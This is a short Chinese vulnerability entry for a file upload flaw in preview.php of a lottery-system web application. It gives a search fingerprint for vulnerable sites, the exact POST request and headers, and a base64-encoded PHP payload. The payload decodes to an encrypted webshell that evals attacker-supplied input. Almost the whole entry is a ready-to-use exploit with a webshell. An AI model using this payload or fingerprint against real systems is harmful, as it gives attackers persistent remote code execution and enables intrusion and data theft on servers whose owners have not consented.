# 彩票系统存在任意文件preview.php上传漏洞

- **系统**：彩票系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="main.e5ee9b2df05fc2d310734b11cc8c911e.css"`
- **请求**：`POST /statics/admin/webuploader/0.1.5/server/preview.php HTTP/2`
- **关键头**：`Sec-Fetch-User: ?1`　`If-Modified-Since: Mon, 05 Sep 2022 01:19:50 GMT`　`If-None-Match: "63154eb6-273"`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 746`　`data: image/php;base64,PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IAoJJF9TRVNTSU9OWydrJ109JGtleTsKCSRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOwoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkKCXsKCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7CgkJJHBvc3Q9JHQoJHBvc3QuIiIpOwoJCQoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgewogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOyAKICAgIAkJCX0KCX0KCWVsc2UKCXsKCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsKCX0KICAgICRhcnI9ZXhwbG9kZSgnfCcsJHBvc3QpOwogICAgJGZ1bmM9JGFyclswXTsKICAgICRwYXJhbXM9JGFyclsxXTsKCWNsYXNzIEN7cHVibGljIGZ1bmN0aW9uIF9faW52b2tlKCRwKSB7ZXZhbCgkcC4iIik7fX0KICAgIEBjYWxsX3VzZXJfZnVuYyhuZXcgQygpLCRwYXJhbXMpOwo/Pg==`
- **预期**：200　|　—